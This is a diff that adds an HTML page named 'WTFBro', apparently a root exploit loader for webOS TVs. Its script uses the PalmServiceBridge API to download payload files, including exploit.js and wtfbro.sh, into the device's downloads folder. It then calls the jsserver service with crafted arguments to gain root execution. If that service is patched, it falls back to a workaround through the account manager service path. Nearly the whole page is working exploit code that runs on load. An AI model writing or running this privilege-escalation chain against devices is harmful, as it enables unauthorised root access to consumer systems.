@@ -1,0 +1,192 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WTFBro</title>
+  <style>
+    html, body {
+      margin: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #050505;
+      font-family: sans-serif;
+      color: #000000;
+    }
+    #close{
+	    background: #c0c0c0;
+  width: 1em;
+  text-align: center;
+    }
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    main {
+      min-width: 320px;
+      max-width: 80vw;
+       border-style: solid;
+  border-width: 5px;
+       border-color: #808080;
+      background: #c0c0c0;
+    }
+    #main{
+ padding: 24px 28px;
+      text-align: center;
+
+    }
+
+    #title p {
+      font-size: 14px;
+      margin: 0px;
+    }
+
+    .label{color:#ffffff;width: 100%;}
+    #title{
+	    padding: 5px;
+	    display: flex;
+	background-color: #052d9b;
+    }
+    .state {
+      margin: 0;
+      font-size: 34px;
+      font-weight: 700;
+    }
+
+    .pending { color: #ffef00; }
+    .success { color: #80ff00; }
+    .failed { color: #f00; }
+
+    .detail {
+      margin: 14px 0 0;
+      font-size: 15px;
+      word-break: break-word;
+    }
+
+  </style>
+</head>
+<body>
+  <main>
+
+    <div id="title">
+    <p class="label">WTFBro</p>
+    <p id="close">X</p>
+    </div>
+    <div id="main">
+    <p id="state" class="state pending">pending</p>
+    <p id="detail" class="detail">starting download...</p>
+    </div>
+  </main>
+  <script>
+    var stateEl = document.getElementById('state');
+    var detailEl = document.getElementById('detail');
+
+    function setState(name, detail) {
+      stateEl.textContent = name;
+      stateEl.className = 'state ' + name;
+      detailEl.textContent = detail || '';
+    }
+
+    function failStep(step, detail) {
+      setState('failed', step + ': ' + (detail || 'unknown failure'));
+    }
+
+    function isObject(value) {
+      return value !== null && typeof value === 'object';
+    }
+
+    function parse(payload) {
+      if (typeof payload !== 'string') return payload;
+      try {
+        return JSON.parse(payload);
+      } catch (_) {
+        return payload;
+      }
+    }
+
+    function runRootExploit() {
+      setState('pending', 'preparing root execution...');
+   var workymgs='Yippee root exploit is worky!!!Setting homebrew up...';
+
+      var payloadBase = new URL('./payload/', window.location.href).toString();
+      var files = [
+        'package.json' , 
+        'services.json', 
+        'exploit.js'   , 
+        'wtfbro.sh'    , 
+      ];
+      var written = 0;
+      var targetDir = '/media/internal/downloads';
+
+      function onAllWritten() {
+        setState('pending', 'triggering root execution...');
+        var bridge = new window.PalmServiceBridge();
+        bridge.onservicecallback = function(payload) {
+          var parsed = parse(payload);
+		console.log(parsed);
+          if ( parsed.returnValue === false && parsed.error.includes("trusted locations")  ) {
+            failStep('jsserver', 'jsserver is patched.Trying workaround');
+        var patched = new window.PalmServiceBridge();
+		  patched.onservicecallback = function(payload) {
+          var parsed = parse(payload);
+	   if (parsed.returnValue === false && parsed.error.includes("trusted locations") ) {
+            failStep('jsserver', 'Workaround is no worky.');
+	   }else if ( parsed.returnValue === false) {
+            failStep('jsserver', parsed.error || 'jsserver call failed');
+	   }else {
+            setState('success', workymgs);
+	   }
+		  }
+ patched.call('luna://com.webos.service.jsserver/run',
+          JSON.stringify({"inputParams": "QwQ -- /tmp/cgroup /usr/palm/services/com.webos.service.accountmanager " + targetDir}));
+
+	  } else if ( parsed.returnValue === false) {
+            failStep('jsserver', parsed.error || 'jsserver call failed');
+	  } else {
+            setState('success', workymgs);
+	  }
+	};
+        bridge.call('luna://com.webos.service.jsserver/run',
+          JSON.stringify({"inputParams": "-- /tmp/cgroup QwQ " + targetDir}));
+
+        setState('pending', 'root exploit running. Watch your TV for the result...');
+        }
+
+      function downloadFile(file) {
+        var b = new window.PalmServiceBridge();
+        b.onservicecallback = function(payload) {
+          var parsed = parse(payload);
+          if (!isObject(parsed)) { failStep('payload download', file + ': invalid response'); return; }
+          if (parsed.returnValue === false) { failStep('payload download', file + ': ' + (parsed.errorText || 'failed')); return; }
+          if (parsed.completed === true && !parsed.aborted && !parsed.interrupted) {
+            written++;
+            setState('pending', 'downloaded ' + written + '/' + files.length + ' payload files...');
+	if (written === files.length){onAllWritten();}
+          } else if (parsed.aborted || parsed.interrupted || parsed.state === 'failed') {
+            failStep('payload download', file + ': ' + (parsed.errorText || 'aborted'));
+          }
+        };
+        b.call('luna://com.webos.service.downloadmanager/download',
+          JSON.stringify({
+            target: payloadBase + file,
+            targetDir: targetDir,
+            targetFilename: file,
+            subscribe: true
+          }));
+      }
+
+      files.forEach(downloadFile);
+    }
+
+    
+    if (typeof window.PalmServiceBridge === 'undefined') {
+      failStep('bootstrap', 'PalmServiceBridge is not available');
+    } else {
+	runRootExploit();
+    }
+  </script>
+</body>
+</html>
